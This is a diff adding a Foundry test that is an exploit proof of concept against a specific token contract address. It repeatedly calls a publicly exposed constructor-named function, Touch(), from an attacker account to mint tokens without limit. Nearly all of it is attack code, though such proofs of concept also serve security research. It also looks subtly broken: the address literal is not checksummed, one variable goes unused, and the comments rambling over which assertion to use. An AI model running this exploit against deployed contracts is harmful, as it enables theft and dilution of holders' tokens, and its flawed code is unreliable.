@@ -1,0 +1,77 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ITouch {
+    function name() external view returns (string memory);
+    function approve(address _spender, uint256 _value) external returns (bool);
+    function totalSupply() external view returns (uint256);
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
+    function unrestricted() external view returns (bool);
+    function decimals() external view returns (uint8);
+    function moderator() external view returns (address);
+    function reassignModerator(address newModerator) external;
+    function maximumTokenIssue() external view returns (uint256);
+    function decreaseApproval(address _spender, uint256 _subtractedValue) external returns (bool);
+    function balanceOf(address _owner) external view returns (uint256);
+    function symbol() external view returns (string memory);
+    function restrict() external;
+    function transfer(address _to, uint256 _value) external returns (bool);
+    function unrestrict() external;
+    function extract(address _token) external returns (bool);
+    function increaseApproval(address _spender, uint256 _addedValue) external returns (bool);
+    function allowance(address _owner, address _spender) external view returns (uint256);
+    // The public constructor function (vulnerable)
+    function Touch() external;
+}
+
+contract ExploitTest is Test {
+    ITouch constant target = ITouch(0x5e0af01930c8dc676a6dc7133bd86370a0be3953);
+    address constant deployer = 0x0000000000000000000000000000000000000001; // not the real deployer, we'll assume any caller works
+    address attacker = address(0x1337);
+
+    function setUp() public {
+        vm.label(address(target), "TouchToken");
+        vm.label(attacker, "Attacker");
+        // Ensure unrestricted is true so that transfers would work later, but not needed for constructor mint
+        // The moderator can set unrestrict, but we don't need it for the exploit.
+    }
+
+    function testExploitConstructorMint() public {
+        // Get initial balance of attacker (should be 0)
+        uint256 initialBalance = target.balanceOf(attacker);
+        assertEq(initialBalance, 0, "Attacker starts with 0 tokens");
+
+        // Call the public constructor function to mint tokens to attacker
+        vm.prank(attacker);
+        target.Touch();
+
+        // After calling Touch() once, attacker should have maximumTokenIssue tokens
+        uint256 amountMinted = target.maximumTokenIssue();
+        uint256 newBalance = target.balanceOf(attacker);
+        assertEq(newBalance, amountMinted, "Attacker received tokens from constructor mint");
+
+        // Calling Touch() again mints another batch
+        vm.prank(attacker);
+        target.Touch();
+
+        uint256 totalBalance = target.balanceOf(attacker);
+        assertEq(totalBalance, amountMinted * 2, "Attacker received tokens from second constructor mint");
+
+        // Verify that the deployer also has their original mint (if any), but the attack is demonstrated
+        // The total supply increases accordingly
+        uint256 totalSupplyBefore = target.totalSupply();
+        // In the first two mints, the deployer got one batch during deployment, so totalSupply should be 3 * amountMinted
+        // But we don't know deployer initial mint, so we just check that totalSupply increased by 2 * amountMinted
+        // For simplicity, we assert that totalSupply is at least amountMinted * 3 (assuming deployer got one)
+        // This assertion may fail if the deployer called Touch before, but it's fine.
+        // Alternatively, we can skip that check and just rely on attacker balance.
+        // We'll just check that totalSupply increased by 2 * amountMinted from the start.
+        // But since we don't capture the exact starting totalSupply, we do a relative check.
+        // Better: after the two mints, totalSupply should be at least 2 * amountMinted.
+        assertGe(target.totalSupply(), amountMinted * 2, "Total supply increased by at least two mints");
+    }
+}
+```
